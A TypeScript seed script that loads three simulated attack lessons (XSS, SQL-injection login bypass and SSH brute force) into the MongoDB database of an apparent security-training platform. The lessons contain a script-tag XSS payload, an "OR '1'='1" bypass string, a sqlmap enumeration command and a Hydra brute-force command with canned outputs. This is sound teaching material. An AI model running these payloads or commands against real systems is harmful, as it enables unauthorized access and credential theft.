/* eslint-disable prettier/prettier */
import * as mongoose from 'mongoose';
import * as dotenv from 'dotenv';
import { ScenarioSchema } from '../src/scenario/scenario.model';

dotenv.config();

async function seedScenarios() {
    try {
        // Connect to MongoDB
        await mongoose.connect(process.env.DB);
        console.log('Connected to MongoDB');

        const ScenarioModel = mongoose.model('Scenario', ScenarioSchema);

        // Clear existing scenarios (optional - comment out if you want to keep existing data)
        await ScenarioModel.deleteMany({});
        console.log('Cleared existing scenarios');

        // Sample Scenario 1: XSS Attack
        const xssScenario = {
            title: 'Cross-Site Scripting (XSS) Attack',
            description: 'Learn how to identify and exploit XSS vulnerabilities in a web application',
            attackType: 'XSS',
            difficulty: 'easy',
            completionCriteria: 'Successfully execute an XSS payload that displays an alert box',
            steps: [
                {
                    stepOrder: 0,
                    stepType: 'terminal',
                    title: 'Reconnaissance',
                    description: 'First, let\'s scan the target website for input fields',
                    expectedCommand: 'curl http://vulnerable-site.com',
                    validationType: 'exact',
                    terminalOutput: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><form><input name="search" /></form></body></html>',
                    hints: ['Use curl to fetch the webpage', 'The URL is http://vulnerable-site.com'],
                    isOptional: false,
                },
                {
                    stepOrder: 1,
                    stepType: 'web',
                    title: 'Test for XSS',
                    description: 'Submit a basic XSS test payload in the search field',
                    expectedAction: {
                        field: 'search',
                        payload: '<script>alert("XSS")</script>',
                    },
                    validationType: 'exact',
                    webResponse: {
                        success: true,
                        message: 'XSS vulnerability found! The script was executed.',
                        alert: 'XSS',
                    },
                    hints: ['Try injecting a script tag', 'Use the alert() function to test'],
                    isOptional: false,
                },
                {
                    stepOrder: 2,
                    stepType: 'terminal',
                    title: 'Document the vulnerability',
                    description: 'Save your findings to a report file',
                    expectedCommand: 'echo "XSS found in search field" > report.txt',
                    validationType: 'regex',
                    validationPattern: '^echo.*>.*\\.txt$',
                    terminalOutput: 'Report saved successfully',
                    hints: ['Use echo and output redirection', 'Save to a .txt file'],
                    isOptional: false,
                },
            ],
        };

        // Sample Scenario 2: SQL Injection
        const sqliScenario = {
            title: 'SQL Injection Attack',
            description: 'Exploit SQL injection vulnerabilities to bypass authentication',
            attackType: 'SQLi',
            difficulty: 'medium',
            completionCriteria: 'Successfully bypass login using SQL injection',
            steps: [
                {
                    stepOrder: 0,
                    stepType: 'terminal',
                    title: 'Identify the target',
                    description: 'Connect to the target application',
                    expectedCommand: 'curl http://login.vulnerable.com',
                    validationType: 'exact',
                    terminalOutput: 'Login page loaded. Form fields: username, password',
                    hints: ['Use curl to access the login page'],
                    isOptional: false,
                },
                {
                    stepOrder: 1,
                    stepType: 'web',
                    title: 'SQL Injection Payload',
                    description: 'Submit a SQL injection payload to bypass authentication',
                    expectedAction: {
                        username: "admin' OR '1'='1",
                        password: 'anything',
                    },
                    validationType: 'exact',
                    webResponse: {
                        success: true,
                        message: 'Login successful! You are now logged in as admin.',
                        session: 'admin_session_token',
                    },
                    hints: ['Try using OR conditions', 'Think about how SQL queries are constructed'],
                    isOptional: false,
                },
                {
                    stepOrder: 2,
                    stepType: 'terminal',
                    title: 'Extract database information',
                    description: 'Use SQLMap to enumerate the database',
                    expectedCommand: 'sqlmap -u "http://login.vulnerable.com" --dbs',
                    validationType: 'parameterized',
                    validationPattern: '^sqlmap.*--dbs$',
                    terminalOutput: 'Available databases:\n- users_db\n- products_db\n- admin_db',
                    hints: ['Use sqlmap tool', 'The --dbs flag lists databases'],
                    isOptional: false,
                },
            ],
        };

        // Sample Scenario 3: Brute Force Attack
        const bruteForceScenario = {
            title: 'SSH Brute Force Attack',
            description: 'Learn how to perform a brute force attack on SSH service',
            attackType: 'brute-force',
            difficulty: 'hard',
            completionCriteria: 'Successfully crack SSH credentials using Hydra',
            steps: [
                {
                    stepOrder: 0,
                    stepType: 'terminal',
                    title: 'Scan for SSH service',
                    description: 'Use nmap to identify SSH service on the target',
                    expectedCommand: 'nmap -p 22 192.168.1.100',
                    validationType: 'parameterized',
                    validationPattern: '^nmap.*-p.*22.*192\\.168\\.1\\.100$',
                    terminalOutput: '22/tcp open ssh OpenSSH 7.4',
                    hints: ['Use nmap to scan port 22', 'Target IP is 192.168.1.100'],
                    isOptional: false,
                },
                {
                    stepOrder: 1,
                    stepType: 'terminal',
                    title: 'Prepare wordlist',
                    description: 'Create or locate a password wordlist',
                    expectedCommand: 'ls /usr/share/wordlists/rockyou.txt',
                    validationType: 'regex',
                    validationPattern: '^ls.*rockyou.*',
                    terminalOutput: '/usr/share/wordlists/rockyou.txt',
                    hints: ['Common wordlists are in /usr/share/wordlists', 'rockyou.txt is a common wordlist'],
                    isOptional: false,
                },
                {
                    stepOrder: 2,
                    stepType: 'terminal',
                    title: 'Launch brute force attack',
                    description: 'Use Hydra to brute force SSH credentials',
                    expectedCommand: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100',
                    validationType: 'parameterized',
                    validationPattern: '^hydra.*-l.*-P.*ssh://.*',
                    terminalOutput: '[22][ssh] host: 192.168.1.100 login: admin password: password123\nCredentials found!',
                    hints: ['Use hydra with -l for username and -P for password list', 'Target is ssh://192.168.1.100'],
                    isOptional: false,
                },
            ],
        };

        // Insert scenarios
        const scenarios = await ScenarioModel.insertMany([
            xssScenario,
            sqliScenario,
            bruteForceScenario,
        ]);

        console.log(`✅ Successfully seeded ${scenarios.length} scenarios`);
        console.log('Scenarios:');
        scenarios.forEach((s, i) => {
            console.log(`  ${i + 1}. ${s.title} (${s.difficulty}) - ${s.steps.length} steps`);
        });

        await mongoose.connection.close();
        console.log('Database connection closed');
    } catch (error) {
        console.error('Error seeding scenarios:', error);
        process.exit(1);
    }
}

seedScenarios();
